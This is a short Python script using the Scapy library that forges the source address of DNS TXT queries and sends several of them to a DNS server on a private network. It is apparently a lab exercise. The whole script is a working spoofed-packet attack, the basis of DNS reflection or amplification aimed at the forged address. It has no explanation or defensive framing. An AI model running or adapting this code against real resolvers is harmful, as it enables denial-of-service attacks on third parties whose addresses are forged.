from scapy.all import *
import os
fake_source = "10.21.8.4"
dns="10.21.8.2"
dnsport=53
port=80
for i in range(7):
    packet=IP(src=fake_source, dst=dns)/UDP(sport=dnsport, dport=dnsport)/DNS(rd=1, qd=DNSQR(qname="shueISP.bombast.com",qtype="TXT"))
    send(packet)
